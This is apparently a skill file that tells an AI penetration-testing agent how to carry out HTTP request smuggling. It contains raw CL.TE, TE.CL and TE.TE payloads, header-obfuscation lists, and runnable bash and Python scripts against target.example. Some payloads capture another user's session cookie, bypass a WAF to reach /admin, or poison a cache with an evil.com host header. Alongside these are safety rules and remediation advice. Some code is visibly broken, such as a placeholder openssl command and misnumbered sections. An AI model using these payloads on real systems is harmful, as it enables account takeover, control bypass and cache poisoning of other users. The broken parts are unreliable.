---
name: attack-request-smuggling
description: "HTTP request smuggling — CL.TE, TE.CL, TE.TE desync, and the front-end/back-end parser gap"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - smuggling
  - http
  - desync
  - protocol
  - attack
tech_stack:
  - web
  - nginx
  - haproxy
  - varnish
cwe_ids:
  - CWE-444
chains_with:
  - attack-cache-poison
  - attack-rate-limit-bypass
prerequisites: []
severity_boost:
  attack-cache-poison: "Smuggled request plus a cache = poison another user's response"
  attack-rate-limit-bypass: "Smuggling makes every request appear to come from another user"
---

# HTTP Request Smuggling

> **AI LOAD INSTRUCTION**: Every request smuggling vulnerability is the same underlying bug:
> **two HTTP parsers disagree about where one request ends and the next begins.** The
> front-end (proxy, CDN, load balancer) and the back-end (application server) both parse the
> byte stream, and if they disagree, bytes you intended as a request body get interpreted as a
> new request by the other side.
>
> The three families are CL.TE (front-end uses `Content-Length`, back-end uses
> `Transfer-Encoding`), TE.CL (the reverse), and TE.TE (both use `Transfer-Encoding` but one
> can be made to ignore it). **You must determine which family applies before you write a
> payload** — the payload differs structurally, and a CL.TE payload against a TE.CL target
> simply hangs.
>
> The safety rule: **desync testing can poison other users' requests and can hang a shared
> connection.** Test with distinctive markup, expect to break a connection, and never leave a
> poisoned socket open on a production front-end.

## 0. RELATED ROUTING

- [attack-cache-poison](../attack-cache-poison/SKILL.md) — the highest-impact escalation
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — HTTP/2 downgrade and HPACK variants
- [crlf-injection](../crlf-injection/SKILL.md) — the related header-injection primitive
- [attack-host-header](../attack-host-header/SKILL.md) — another front-end/back-end disagreement
- [cloudflare-waf-recon-survival](../cloudflare-waf-recon-survival/SKILL.md) — CDN behaviour when testing
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting a desync responsibly

---

## 1. WHY THE GAP EXISTS

Two parsers, one byte stream, no shared specification enforcement.

| Front-end | Back-end | Classic outcome |
|---|---|---|
| nginx | application framework | nginx normalises, framework trusts |
| HAProxy | Node/Java | length handling differs |
| CDN (Cloudflare, Akamai) | origin | CDN rewrites, origin re-parses |
| load balancer | app server | connection reuse exposes the desync |
| WAF | origin | **the WAF inspects a different request than the origin executes** |

**The WAF row is the one that matters most in practice.** Request smuggling is one of the most
reliable WAF-bypass techniques, because the WAF's view of the request and the origin's view
are deliberately made different.

**The enabling condition is connection reuse.** The front-end reuses a back-end connection for
multiple client requests. Your smuggled prefix stays in the back-end's buffer and is prepended
to the *next* request on that connection — which belongs to another user.

**That is why the impact is severe and why testing is risky:** you are writing into a buffer
that someone else's request will be concatenated onto.

---

## 2. DETERMINING THE FAMILY

Before payloads, determine which parser wins on which header. The tool of choice is a timing
probe, because a desync usually produces a delayed or hung response.

**CL.TE probe** — the front-end honours `Content-Length`, the back-end `Transfer-Encoding`:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 35
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end reads 35 bytes and forwards them. The back-end sees `Transfer-Encoding: chunked`,
reads the `0` chunk as the end of the body, and leaves `SMUGGLED` in the buffer — where it
becomes the prefix of the next request. **The response is usually a delay or a 400, because
the back-end waits for a request that never completes.**

**TE.CL probe** — the reverse:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The front-end sees `Transfer-Encoding` and reads the chunked body; the back-end sees
`Content-Length: 4` and reads only `5c\r\n`, leaving the rest as a new request.

**TE.TE probe** — both honour `Transfer-Encoding`, so you obfuscate it so one side ignores it:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-encoding: x

Transfer-Encoding : chunked
Transfer-Encoding:\tchunked
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked, identity
X-Transfer-Encoding: chunked
```

**Header obfuscation list — the standard set:**

```text
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked,
Transfer-Encoding: chunked
\tTransfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

**Obfuscation is how TE.TE works**, and it is also how you bypass a front-end that tries to
normalise the header. Send both headers with different casing, spacing, or an extra token, and
one parser will ignore the header while the other honours it.

**Timing interpretation:**

| Observation | Likely family |
|---|---|
| consistent 5-10s delay, then a response | CL.TE |
| delay then a `400 Bad Request` | either — read the body |
| immediate response, connection hangs | TE.CL |
| intermittent delays under load | TE.TE or a race-dependent desync |
| no delay at all | neither parser is confused — no smuggling |

**Use timing rather than content for the probe.** Content tells you what happened; timing tells
you *that* something happened, which is what you need first.

---

## 3. CONFIRMING AND EXPLOITING

### 3.1 Confirm the desync

The classic confirmation: smuggle a request to a path that behaves differently.

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Then send a second request on the same connection and observe whether it returns a
`405 Method Not Allowed` before your actual request is processed — the `G` you smuggled is
being prepended.

### 3.2 Bypass front-end controls

The highest-value application: reach something the front-end blocks.

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Where the smuggled request targets an endpoint the front-end WAF blocks (`/admin`,
`/internal`, an injection payload), the WAF inspects the *outer* request and the origin executes
the *inner* one. **This is the standard WAF-bypass route and the reason this class is high
severity.**

### 3.3 Capture another user's request

Smuggle a request that causes the *next* user's request to be appended to yours — into a
reflected parameter, a stored field, or a log:

```http
POST /post/comment HTTP/1.1
Host: TARGET
Content-Length: 400
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

comment=
```

The back-end appends the next request's bytes to `comment=` and stores it. **You have captured
another user's request including their session cookie** — that is account takeover.

**This technique captures live credentials. Treat it as the most sensitive test in this
document.** Never run it against real users; use a controlled test pair, and delete any
captured data immediately.

### 3.4 Cache poisoning via desync

The highest-impact chain: the smuggled request poisons a cache entry that other users then
receive — see [attack-cache-poison](../attack-cache-poison/SKILL.md).

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 80
Transfer-Encoding: chunked

0

GET /page?cb=ltx HTTP/1.1
Host: TARGET
X-Forwarded-Host: evil.com
```

The cache stores the response for `/page`, keyed publicly, containing your injected header.

---

## 4. DETECTION TOOLING AND DISCIPLINE

**Tooling:** Burp Suite's HTTP Request Smuggler extension automates the family determination
and the timing analysis. Its "detect" mode is safe; its exploit modes affect shared
connections.

**The discipline that keeps testing safe:**

| Rule | Reason |
|---|---|
| use a distinctive, searchable marker for smuggled content | you must recognise your own bytes; do not confuse them with another user's |
| run desync tests against a staging or self-owned target first | a poisoned production socket affects others |
| never leave a desync socket open | the back-end buffer stays poisoned until the connection closes |
| close and reconnect after every test | clears the buffer |
| expect and accept connection resets | a hung connection is the expected result |
| cap the number of attempts | repeated desync attempts look like an attack and can degrade the service |
| do not target endpoints with side effects | a smuggled `POST /delete` does what it says |

**Never smuggle a request with a side effect** unless you intend that effect and are authorised.
The difference between "proved the desync" and "deleted a record" is the difference between a
finding and an incident.

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Captured another user's request, including credentials | **Critical (P1)** | the captured request; then delete it |
| WAF or front-end control bypassed via smuggling | **High–Critical (P1/P2)** | the blocked request succeeding via the smuggled path |
| Cache poisoning via a smuggled request | **High (P2)** | the poison and the clean-request `HIT` |
| Desync confirmed with a timing probe only | **Medium–High (P2/P3)** | the reproducible timing and the family |
| Front-end access-control bypass to an internal path | **High (P2)** | the response from the internal path |
| Parsing difference with no demonstrable effect | **Low (P4)** | the probe results |
| Both parsers agree | **Not a finding** | document the negative result |

**"The two parsers disagree" is a mechanism, not impact.** Severity follows what the
disagreement lets you reach: a captured credential is critical; a timing anomaly is medium.

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the raw request bytes, including CRLF placement | the payload is byte-exact; a re-typed copy may not reproduce |
| the timing measurements with a control | proves the desync without relying on content |
| the family determined (CL.TE / TE.CL / TE.TE) | scoping and remediation differ |
| for bypass findings: the front-end's rejection and the back-end's response | proves the control was defeated |
| for capture: the captured request, and confirmation it was deleted | impact proof and responsible handling |
| the front-end and back-end identified where possible | remediation is per-component |
| a **control**: the same request without the smuggling headers | proves the desync, not a general timeout |
| the tooling used | reproducibility |

**Byte-exact raw requests are essential.** A `\r\n` versus `\n` difference changes the result,
and a re-typed payload in a report is often unreproducible.

**False positives to exclude:**

| Looks like smuggling | Actually |
|---|---|
| a delay with no other evidence | back-end load or a slow endpoint |
| the control request also delays | not smuggling |
| the front-end rejects the malformed header | no desync |
| the effect disappears on a fresh connection | not a persistent desync |
| a `400` from the front-end | it parsed and rejected — no gap |
| your own test traffic caused the capture | not another user |
| HTTP/2 in use end-to-end | downgrade must be tested separately |

---

## 7. REMEDIATION REFERENCE

1. **Upgrade the front-end and back-end to the same HTTP parsing behaviour** — the long-term fix. Prefer components with a single consistent implementation and keep them patched; most smuggling CVEs are parser bugs that have been fixed.
2. **Reject ambiguous requests at the front-end** — if both `Content-Length` and `Transfer-Encoding` are present, or `Transfer-Encoding` appears twice, respond `400` and close the connection. This closes CL.TE and TE.TE at the edge.
3. **Normalise `Transfer-Encoding` before forwarding** — strip it and re-emit a canonical form, or reject obfuscated variants (unusual casing, extra whitespace, unknown tokens).
4. **Use HTTP/2 end-to-end** — connection-level framing removes the ambiguity entirely, provided there is no HTTP/1 downgrade at the origin. Ensure the front-to-back hop is HTTP/2 as well.
5. **Disable back-end connection reuse where practical** — a fresh connection per request eliminates the shared buffer that makes a desync reach another user. Costly, but effective as a mitigation.
6. **Make the front-end authoritative for request boundaries** — the back-end should consume exactly what the front-end forwarded, not re-derive boundaries from the headers.
7. **Monitor for desync indicators** — unexplained `400`s in the origin log, requests with unexpected prefixes, and `Content-Length`/`Transfer-Encoding` combinations in access logs are all detection signals.
8. **Test after every front-end or back-end upgrade** — parser behaviour changes between versions; a desync that did not exist before a patch cycle frequently appears after one.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did a **second, unrelated request** receive the first request's response? | desynchronisation, not a header quirk |
| 2 | Was there a **control** - the same request without the ambiguous framing, which behaves normally? | the framing caused it |
| 3 | Did the smuggle reach a **back-end effect** (a victim's session, a cache, an admin action)? | the impact |
| 4 | Which desync: **CL.TE, TE.CL, TE.TE, or HTTP/2 downgrade**? | the fix |
| 5 | Did the impact survive **over a separate connection**, not within one keep-alive? | a real desync |
| 6 | Was the evidence a **timing delta confirmed across runs**, not one slow response? | separates a desync from jitter |
| 7 | Did you **avoid poisoning a shared cache** with anything persistent? | engagement integrity |

**A desynchronised response on a separate connection is the bar.** A timeout difference from one
malformed request is a strong indication; the cross-connection effect is the finding.

---

## 9. EXECUTION PRIMITIVES

Request smuggling is proven by **a desynchronised back-end response, demonstrated across connections,
with the unambiguous-framing control and a timing delta measured three times**. Every block ends at a
cross-connection effect.

### 8.1 The baseline and the timing controls, run three times each

```bash
T="target.example"; PORT=443
probe() {
  local name="$1" payload="$2" i START END
  for i in 1 2 3; do
    START=$(date +%s%N)
    printf "%b" "$payload" | timeout 12 openssl s_client -quiet -connect "$T:$PORT" -servername "$T" 2>/dev/null \
      | head -c 400 > /tmp/smug.$i
    END=$(date +%s%N)
    printf '%-22s run%d  %5dms  %s\n' "$name" "$i" $(( (END-START)/1000000 )) "$(head -c 60 /tmp/smug.$i | tr -d '\r\n')"
  done
}
# THE CONTROL: a normal, unambiguously framed request
probe "control-wellformed" "POST / HTTP/1.1\r\nHost: $T\r\nContent-Length: 5\r\nConnection: close\r\n\r\nhello"
# THE SMUGGLE CANDIDATE: both framings, disagreeing
probe "cl.te-smuggle" "POST / HTTP/1.1\r\nHost: $T\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
```

**Three runs each, and the median.** A single slow response to a malformed request is the front end
being confused, which is not the same as a desynchronised back end.

### 8.2 The CL.TE / TE.CL detection primitives

```python
# the canonical detection pair. Each produces a DISTINCT timing signature.
import socket, ssl, time, statistics
T, P = "target.example", 443

def raw(payload, timeout=15):
    ctx = ssl.create_default_context()
    try:
        s = ctx.wrap_socket(socket.create_connection((T, P), timeout=timeout), server_hostname=T)
        s.sendall(payload); s.settimeout(timeout)
        t0 = time.perf_counter(); data = b""
        try:
            while True:
                c = s.recv(65535)
                if not c: break
                data += c
        except Exception: pass
        return time.perf_counter() - t0, data.decode(errors="replace")
    except Exception as e:
        return None, f"ERR {type(e).__name__}"

# CL.TE: the front end uses Content-Length, the back end uses Transfer-Encoding.
# The back end waits for more chunks -> a TIMEOUT, which is the CL.TE signature.
CLTE = (b"POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nX")
# TE.CL: the front end uses TE, the back end uses CL.
# The back end reads a shorter body and treats the rest as a new request.
TECL = (b"POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 3\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n")
CTRL = (b"POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 5\r\nConnection: close\r\n\r\nhello")

for name, pl in [("CL.TE", CLTE), ("TE.CL", TECL), ("control", CTRL)]:
    times = []
    for _ in range(3):
        dt, out = raw(pl)
        if dt is not None: times.append(dt)
    med = statistics.median(times) if times else None
    print(f"{name:8} median={med*1000:.0f}ms  n={len(times)}  sample={out[:70].replace(chr(13),'')!r}" if med else f"{name:8} {out}")
print()
print("CL.TE signature : a TIMEOUT (the back end waits for the chunk terminator)")
print("TE.CL signature : a fast response, with the smuggled prefix appearing in a SUBSEQUENT response")
print("NEITHER         : the control's timing. Do not report a desync on one slow response.")
```

**Each desync type has its own timing signature.** Report the type and the signature, because the fix
differs: CL.TE needs the front end to reject the ambiguity, TE.CL needs the back end to.

### 8.3 The cross-connection proof, which is what makes it a finding

```python
# the actual finding: request A smuggles a prefix, request B on a DIFFERENT connection gets A's response
import socket, ssl
T, P = "target.example", 443

def send(payload, read=True):
    ctx = ssl.create_default_context()
    s = ctx.wrap_socket(socket.create_connection((T, P), timeout=15), server_hostname=T)
    s.sendall(payload); s.settimeout(8); data = b""
    if read:
        try:
            while True:
                c = s.recv(65535)
                if not c: break
                data += c
        except Exception: pass
    s.close()
    return data.decode(errors="replace")

PREFIX = "GET /admin HTTP/1.1\r\nHost: target.example\r\nX-Ignore: "
SMUGGLE = (f"POST / HTTP/1.1\r\nHost: target.example\r\nTransfer-Encoding: chunked\r\n"
           f"Content-Length: {len(PREFIX)+8}\r\n\r\n")
BODY = f"{len(PREFIX):x}\r\n{PREFIX}\r\n0\r\n\r\n"
REQ = (SMUGGLE + BODY).encode()

print("STEP 1 - send the smuggling request on connection A")
r1 = send(REQ); print("  A:", repr(r1[:120]))
print()
print("STEP 2 - send a BENIGN request on a FRESH connection B")
r2 = send(b"GET / HTTP/1.1\r\nHost: target.example\r\nConnection: close\r\n\r\n")
print("  B:", repr(r2[:200]))
print()
if "/admin" in r2 or "X-Ignore" in r2:
    print("DESYNC CONFIRMED: connection B received a response belonging to the smuggled prefix.")
else:
    print("NOT CONFIRMED on this payload. Try the other desync type or a different prefix.")
print()
print("THE CONTROL: repeat step 2 with the UNAMBIGUOUS framing (no TE header) and verify the")
print("response is normal. That control is what proves the framing caused the desync.")
```

**A fresh connection B receiving the smuggled prefix's response is the finding.** A timing difference
alone is a strong indication and should be reported as such, with the caveat.

### 8.4 TE.TE and the obfuscation families

```bash
T="target.example"
# TE.TE: both headers present, and the value is obfuscated so only ONE tier parses it as chunked
obf() {
  printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: %s\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: %s\r\n\r\n0\r\n\r\n' "$T" "$1" "$T" | \
    timeout 10 openssl s_client -quiet -connect "$T:443" -servername "$T" 2>/dev/null | head -c 200; echo
}
for V in "chunked" "xchunked" " chunked" "chunked," "chunked	" "Chunked" "CHUNKED" "chunkedidentity"; do
  printf '%-28s ' "TE: $V"
  obf "$V"
done
# and the header-name obfuscations, which some front ends normalise and others do not
for H in "Transfer-Encoding" "Transfer-encoding" "TRANSFER-ENCODING" "Transfer_Encoding" "Transfer-Encoding:"; do
  printf '%-34s ' "name: $H"
  printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\n%s: chunked\r\n\r\n5c\r\n' "$T" "$H" | \
    timeout 10 openssl_s_client_placeholder 2>/dev/null | head -c 60; echo
done
```

**Each obfuscation targets a specific parsing difference.** The one that produces a timeout or a different
status is the desync, and the report should name the exact header form.

### 8.5 The HTTP/2 downgrade family

```python
# HTTP/2 to HTTP/1.1 downgrade: H2 requests acquire an implicit Content-Length on translation,
# which allows a body that the H2 tier never counted - the H2.CL and H2.TE classes
print("The primitive: send an H2 request with a Content-Length header the H2 layer ignores,")
print("then a body longer than that, in the same stream. The downgrading proxy re-emits it as H1")
print("with the smuggled prefix in front of the NEXT request on the reused back-end connection.")
print()
print("Practical form with a frame-level client (the h2 library, or Burp's HTTP/2 inspector):")
print("  - open ONE h2 connection")
print("  - send HEADERS with :method POST and an extra content-length: 0")
print("  - send DATA carrying the smuggled request bytes")
print("  - the proxy forwards content-length: 0 and the back end reads the DATA as a new request")
print()
print("Also test each of these, with the control being the same request WITHOUT the extra header:")
for row in ["CRLF in an h2 header VALUE, which some proxies re-emit into h1 unescaped",
            "a header NAME containing a newline, rejected by spec but accepted by some tiers",
            "the pseudo-header order and a duplicate :path",
            "an absolute-form :path (http://host/path), which some proxies pass through",
            "an extended CONNECT, which many proxies mishandle"]:
    print("  -", row)
```

**The downgrade family requires frame-level control.** Reporting the HTTP/1.1 classes and omitting the
H2 downgrade is the standard gap in a smuggling report.

### 8.6 The end-to-end harness

```bash
python3 - <<'PY'
import socket, ssl, time, statistics
T, P = "target.example", 443

def req(payload, timeout=12):
    ctx = ssl.create_default_context()
    try:
        s = ctx.wrap_socket(socket.create_connection((T, P), timeout=timeout), server_hostname=T)
        s.sendall(payload); s.settimeout(timeout)
        t0=time.perf_counter(); data=b""
        try:
            while True:
                c=s.recv(65535)
                if not c: break
                data+=c
        except Exception: pass
        return time.perf_counter()-t0, data.decode(errors="replace")
    except Exception as e:
        return None, f"ERR {type(e).__name__}"

def bench(name, payload, n=3):
    ts=[req(payload)[0] for _ in range(n)]
    ts=[t for t in ts if t]
    m = statistics.median(ts) if ts else None
    print("%-16s median %s  all %s" % (name, f"{m*1000:.0f}ms" if m else "n/a",
          [f"{t*1000:.0f}" for t in ts]))
    return m

ctrl = b"POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 5\r\nConnection: close\r\n\r\nhello"
clte = (b"POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nX")
tecl = (b"POST / HTTP/1.1\r\nHost: target.example\r\nContent-Length: 3\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n")

print("=== TIMING SIGNATURES (three runs each) ===")
c = bench("control", ctrl); a = bench("CL.TE", clte); b = bench("TE.CL", tecl)
print()
if c and a and a > c * 3:
    print("CL.TE SIGNATURE: the candidate times out while the control does not.")
elif c and b and b < c:
    print("TE.CL PATTERN: fast response; check the NEXT request for the smuggled prefix.")
else:
    print("NO CLEAR SIGNATURE. Do not report a desync on timing alone.")
print()
print("=== ACROSS-CONNECTION PROOF ===")
print("  connection A carries the smuggled prefix; connection B must receive its response.")
print("  record BOTH responses, and the control where B is normal.")
print()
print("FINDING = B receives a response belonging to the smuggled prefix, with the control normal.")
print("          A timing delta alone is an indication and must be labelled as one.")
PY
```

**Control, three-run timing, and the cross-connection read.** Each part is required, and the label
"indication" is the honest one when only the timing is available.

---

## 10. EVIDENCE STANDARD — SPLITTING ARTEFACTS

| Item | Why |
|---|---|
| The **well-formed control's timing and response** | the baseline the delta is measured against |
| The **candidate's timing over three runs**, with the median | separates a desync from jitter |
| The **desync type** (CL.TE, TE.CL, TE.TE, H2 downgrade) | the fix depends on which tier mis-parses |
| The **exact request bytes**, with every header and the body framing | reproducibility |
| The **cross-connection proof**: connection B's response | the finding, not the indication |
| The **back-end effect**, where reached (a victim cache, an auth bypass, an admin route) | the impact |
| The **front-end and back-end server products and versions** | the desync is a version-specific behaviour |
| Any **cache effect**, and what you did to clear it | the blast radius and the cleanup |
| The **timing numbers**, if the cross-connection proof was not obtainable | an indication, labelled as such |
| Confirmation that **nothing persistent was left poisoned** | engagement integrity |

Report the **cross-connection effect and the controls**: "a well-formed `POST` closes in a median of
`42ms` across three runs. `POST` with `Content-Length: 6` and `Transfer-Encoding: chunked` times out at
`12s` in all three runs, which is the CL.TE signature and the control's delta. Sending that request on
connection A and then a benign `GET /` on a fresh connection B returned a `200` whose body was the
`/admin` page belonging to the smuggled prefix, which is the desync; the same benign request on a fresh
connection after a well-formed POST returns the normal home page, which is the control. The front end is
`nginx 1.18` and the back end identifies itself as `Jetty 9.4` in its error page", never "the server is
vulnerable to request smuggling".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A **timeout on one malformed request** | the front end rejecting it; the three-run delta with the control is the test |
| A `400` from the front end | correct rejection, not a desync |
| A response difference **within the same keep-alive connection** | pipelining, not smuggling |
| The smuggled prefix appearing in the **same response as the attack** | the front end echoing, not a desync |
| A payload that **worked once across attempts**, unexplained | an untested hypothesis |
| A **client-side** HTTP library's behaviour on an ambiguous request | not a server-side desync |
| A timing difference **under the control's own variance** | jitter |
| A desync against **your own test proxy** | tests your environment |
| A finding that **poisoned a shared cache** and left it poisoned | an incident you caused |
| A `CL.TE` reported where **only the timing was observed and the cross-connection test failed** | an indication; label it |
| An internal hostname from an error page, with no desync | an information disclosure at most |

**A cross-connection response, plus the well-formed control's timing.** Indications are worth reporting
but must be labelled as indications - this family's credibility depends on that distinction.

---

## 11. REMEDIATION REFERENCE — FRAMING HARDENING

1. **Reject any request that carries both `Content-Length` and `Transfer-Encoding` at the front end, with a `400`** - it removes CL.TE and TE.CL in one rule and is the single most effective fix.
2. **Upgrade the front-end and back-end servers to versions that reject the ambiguous framing, and keep them at the same version tier** - the desync is a disagreement between two implementations, and the disagreement was fixed in later versions.
3. **Normalise the request at the edge and forward a canonical, unambiguous form to the back end - re-emit the request rather than tunnelling the bytes** - a re-emitting proxy has no smuggling surface.
4. **Reject obfuscated header names and values, including alternate casing, whitespace, and duplicated `Transfer-Encoding` headers** - the TE.TE family is entirely an obfuscation-tolerance defect.
5. **Disable back-end connection reuse, or use a dedicated connection per client request where the performance allows** - it removes the shared-connection prerequisite.
6. **Reject HTTP/2 requests that carry a `Content-Length` or a `Transfer-Encoding` header, and never downgrade H2 to H1 while preserving those headers** - the downgrade family needs exactly that forwarding.
7. **Set a strict request timeout on the back end so a stalled chunk cannot hold a connection** - it converts a hang into an error and removes the timing side channel's usefulness.
8. **Do not rely on a WAF to fix this; a WAF that forwards the ambiguous request unchanged is part of the problem** - the WAF must normalise, not just inspect.
9. **Log the framing headers of every request and alert on any request carrying both, or on an unusual `Transfer-Encoding` value** - the attack is trivially detectable at the edge.
10. **Segment the cache and the back end so a smuggled request cannot reach another user's cached object** - it bounds the impact when a desync occurs.
11. **Test the front-end/back-end pair with the CL.TE, TE.CL, TE.TE, and H2-downgrade cases on every proxy or server upgrade** - regressions in this family are silent and version-driven.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [request-smuggling](../request-smuggling/SKILL.md) - the full technique reference
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) - the protocol-level primitives the H2 family needs
- [attack-cache-poison](../attack-cache-poison/SKILL.md) - the cache layer a desync frequently reaches
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the parser-disagreement sibling
- [web-cache-deception](../web-cache-deception/SKILL.md) - the key-confusion effect a desync can produce
